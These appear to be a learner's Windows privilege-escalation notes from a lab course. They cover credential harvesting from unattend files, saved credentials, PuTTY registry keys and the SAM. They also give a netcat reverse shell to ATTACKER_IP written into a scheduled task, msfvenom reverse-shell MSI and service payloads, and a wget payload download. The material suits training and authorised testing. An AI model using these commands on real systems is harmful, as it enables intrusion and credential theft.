# Commands

`ipconfig`
Windows operating systems, displays or refreshes IP settings for network interfaces.

`dir`
ls command powershell
`dir /AD
lists directories

`type`
prints file to stdout
`pathping
In Windows, behaves similarly to tracert by pinging every hop along the route to determine relative latency.




---
# Handy Windows files

shows logs
`Event Viewer

The `hashdump` in Meterpreter command will list the content of the SAM database. The SAM (Security Account Manager) database stores user's passwords on Windows systems. These passwords are stored in the NTLM (New Technology LAN Manager) format.

c:\Windows\System32\config\
Stores Windows Passwords

These store credentials:
- `C:\Unattend.xml
- `C:\Windows\Panther\Unattend.xml
- `C:\Windows\Panther\Unattend\Unattend.xml
- `C:\Windows\system32\sysprep.inf
- `C:\Windows\system32\sysprep\sysprep.xml
- `C:\Windows\system32\sysprep\sysprep.xml


---
# Enumeration

## Tools

https://medium.com/@jamesjarviscyber/windows-privilege-escalation-tryhackme-96e9f8eaeb27

[pentest monkey windows scanner](https://github.com/pentestmonkey/windows-privesc-check)

https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Privesc/PowerUp.ps1

## CMD History
Shows cmd.exe command history
```cmd
type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
```
>To read the file from Powershell, you'd have to replace `%userprofile%` with `$Env:userprofile`

## Saved Creds
list saved credentials:
```shell-session
cmdkey /list
```
While you can't see the actual passwords, if you notice any credentials worth trying, you can use them with the `runas` command and the `/savecred` option, as seen below.
```shell-session
runas /savecred /user:admin cmd.exe
```
`runas /savecred /user:mike.katz cmd.exe`

## Database connection strings
find database connection strings on either `web.config` file:
```shell-session
type C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config | findstr connectionString
```
```shell-session
type C:\inetpub\wwwroot\web.config | findstr connectionString
```

## Files that store creds
These store credentials:
- `C:\Unattend.xml
- `C:\Windows\Panther\Unattend.xml
- `C:\Windows\Panther\Unattend\Unattend.xml
- `C:\Windows\system32\sysprep.inf
- `C:\Windows\system32\sysprep\sysprep.xml
- `C:\Windows\system32\sysprep\sysprep.xml

## Exploit SSH client (PuTTY) for stored creds
PuTTY is an SSH client commonly found on Windows systems
retrieve the stored proxy credentials, you can search under the following registry key for ProxyPassword with the following command:
```shell-session
reg query HKEY_CURRENT_USER\Software\SimonTatham\PuTTY\Sessions\ /f "Proxy" /s
```


---

# Privilege Escalation

## Scheduled Tasks

`schtasks
`schtasks /query /tn vulntask /fo list /v

what matters is: 
`Task To Run:              C:\tasks\schtask.bat

If our current user can modify or overwrite the "Task to Run" executable, we can control what gets executed by the taskusr1 user, resulting in a simple privilege escalation. To check the file permissions on the executable, we use 
`icacls`
`icacls c:\tasks\schtask.bat

in the result, the **BUILTIN\Users** group has full access (F) over the task's binary
`BUILTIN\Users:(I)(F)`

change the bat file to spawn a reverse shell:
```shell-session
echo c:\tools\nc64.exe -e cmd.exe ATTACKER_IP 4444 > C:\tasks\schtask.bat
```


## AlwaysInstallElevated

Windows installer files (also known as .msi files) are used to install applications on the system. They usually run with the privilege level of the user that starts it. However, these can be configured to run with higher privileges from any user account (even unprivileged ones). This could potentially allow us to generate a malicious MSI file that would run with admin privileges.

This method requires two registry values to be set. You can query these from the command line using the commands below.

```shell-session
C:\> reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer
C:\> reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer
```

To be able to exploit this vulnerability, both should be set. Otherwise, exploitation will not be possible. If these are set, you can generate a malicious .msi file using `msfvenom`, as seen below:

```shell-session
msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKING_10.10.65.211 LPORT=LOCAL_PORT -f msi -o malicious.msi
```

As this is a reverse shell, you should also run the Metasploit Handler module configured accordingly. Once you have transferred the file you have created, you can run the installer with the command below and receive the reverse shell:

```shell-session
C:\> msiexec /quiet /qn /i C:\Windows\Temp\malicious.msi
```


## Windows Services

### Insecure Permissions on Service Executable

```shell-session
sc qc WindowsScheduler

SERVICE_NAME: windowsscheduler
        TYPE               : 10  WIN32_OWN_PROCESS
        START_TYPE         : 2   AUTO_START
        ERROR_CONTROL      : 0   IGNORE
        BINARY_PATH_NAME   : C:\PROGRA~2\SYSTEM~1\WService.exe
        LOAD_ORDER_GROUP   :
        TAG                : 0
        DISPLAY_NAME       : System Scheduler Service
        DEPENDENCIES       :
        SERVICE_START_NAME : .\svcuser1
```
Important objects are:
	`BINARY_PATH_NAME`
	`SERVICE_START_NAME`

1. Query the permissions of the service executable
```shell-session
icacls C:\PROGRA~2\SYSTEM~1\WService.exe

C:\PROGRA~2\SYSTEM~1\WService.exe Everyone:(I)(M)
```
The Everyone group has modify permissions (M) on the service's executable

2. generate an exe-service payload using msfvenom and serve it through a python webserver
`msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4445 -f exe-service -o rev-svc.exe

`python3 -m http.server

3. Then pull the payload from Powershell with the following command
`wget http://ATTACKER_IP:8000/rev-svc.exe -O rev-svc.exe

4. nce the payload is in the Windows server, we proceed to replace the service executable with our payload. Since we need another user to execute our payload, we'll want to grant full permissions to the Everyone group as well:

```shell-session
C:\> cd C:\PROGRA~2\SYSTEM~1\

C:\PROGRA~2\SYSTEM~1> move WService.exe WService.exe.bkp
        1 file(s) moved.

C:\PROGRA~2\SYSTEM~1> move C:\Users\thm-unpriv\rev-svc.exe WService.exe
        1 file(s) moved.

C:\PROGRA~2\SYSTEM~1> icacls WService.exe /grant Everyone:F
        Successfully processed 1 files.
```

5. We start a reverse listener on our attacker machine:
```shell-session
nc -lvp 4445
```


### Unquoted Service Paths




---
# Notes

| **SYSTEM / LocalSystem** | An account used by the operating system to perform internal tasks. It has full access to all files and resources available on the host with even higher privileges than administrators. |
| ---- | ---- |
| **Local Service** | Default account used to run Windows services with "minimum" privileges. It will use anonymous connections over the network. |
| **Network Service** | Default account used to run Windows services with "minimum" privileges. It will use the computer credentials to authenticate through the network. |